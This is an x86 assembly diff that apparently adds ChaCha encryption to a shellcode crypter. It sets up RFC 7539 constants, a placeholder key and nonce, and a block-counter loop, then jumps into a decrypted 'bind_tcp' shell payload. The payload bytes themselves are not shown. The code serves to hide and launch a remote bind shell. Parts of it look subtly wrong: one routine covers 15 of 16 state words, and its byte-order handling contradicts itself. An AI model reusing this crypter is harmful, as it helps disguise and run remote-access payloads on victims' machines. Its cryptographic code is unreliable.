@@ -1,20 +1,36 @@
 global _start
 
+; check RFC7539
+; I'd rather choose to start block counter as 0x02 (runtime)
+
 section .data
-	matrixm: db 0x65, 0x78, 0x70, 0x61, \
-		0x6e, 0x64, 0x20, 0x33, \
-		0x32, 0x2d, 0x62, 0x79, \
-		0x74, 0x65, 0x20, 0x6b, \
-		0x4c, 0x4f, 0x4e, 0x47, \
-		0x4c, 0x4f, 0x4e, 0x47, \
-		0x50, 0x41, 0x53, 0x53, \
-		0x57, 0x4f, 0x52, 0x44, \
-		0x4c, 0x4f, 0x4e, 0x47, \
-		0x4c, 0x4f, 0x4e, 0x47, \
-		0x50, 0x41, 0x53, 0x53, \
-		0x57, 0x4f, 0x52, 0x44
-		dd 4 dup (?)
+	matrixm: db 0x61, 0x70, 0x78, 0x65, \
+		0x33, 0x20, 0x64, 0x6e, \
+		0x79, 0x62, 0x2d, 0x32, \
+		0x6b, 0x20, 0x65, 0x74, \
+		0x47, 0x4e, 0x4f, 0x4c, \
+		0x47, 0x4e, 0x4f, 0x4c, \
+		0x53, 0x53, 0x41, 0x50, \
+		0x44, 0x52, 0x4f, 0x57, \
+		0x47, 0x4e, 0x4f, 0x4c, \
+		0x47, 0x4e, 0x4f, 0x4c, \
+		0x53, 0x53, 0x41, 0x50, \
+		0x44, 0x52, 0x4f, 0x57,
+		dd 0x01
+		db 0x45, 0x43, 0x4e, 0x4f, \
+		0x4e, 0x45, 0x43, 0x4e, \
+		0x4f, 0x4e, 0x45, 0x43
+
+		; cccccccc  cccccccc  cccccccc  cccccccc
+		; kkkkkkkk  kkkkkkkk  kkkkkkkk  kkkkkkkk
+		; kkkkkkkk  kkkkkkkk  kkkkkkkk  kkkkkkkk
+		; bbbbbbbb  nnnnnnnn  nnnnnnnn  nnnnnnnn
 	
+		; c=constant k=key b=blockcount n=nonce
+		; c0 = 61707865, c1 = 3320646E, c2 = 79622D32, and c3 = 6B206574 are predefined constants;
+		; blockcount = 32-bit initial counter (ups to 256GB)
+ 		; nonce = 96-bit nonce, also known as Initialization Vector
+
 section .bss
 	matrixv resd 16		; 512-bits
 
@@ -162,25 +178,52 @@ round_l:
 	leave
 	ret
 
+addmatrix:
+	push ebp
+	mov ebp, esp
+	xor ebx, ebx
+	mov ecx, 0xf
+		
+addmatrix_l:
+	mov eax, [matrixv+ebx]
+	add eax, [matrixm+ebx]
+	bswap eax			; little endian conversion
+	mov [matrixv+ebx], eax
+
+	add ebx, 0x04
+	loop addmatrix_l
+
+	leave
+	ret
+
 ; computation of a 64-byte block of the stream of Chacha
 ; input: key, nonce, block counter stored in matrix M
 ; output: a 64-byte block of the stream
 block:	
+	mov eax, [matrixm+48]
+	inc eax
+	mov [matrixm+48], eax	; block counter (word 12)
+	
 	pop esi
 	push esi		; shellcode address
+	push ecx		; stream counter
 	
 	mov ecx, 0x10		; (matrix size) dword
 	lea esi, [matrixm]
 	lea edi, [matrixv]
 	cld			; increment index of ESI|EDI
 	rep movsd		
-	
+		
 	call round
+	call addmatrix
 	
-	loop block
+	pop ecx
+	dec ecx
+	jnz block
 	
 	jmp shellcode
 payload:
+	mov ecx, 0x03
 	call block	
 	; bind_tcp (have to XOR)
 	; size 0x8e (142)
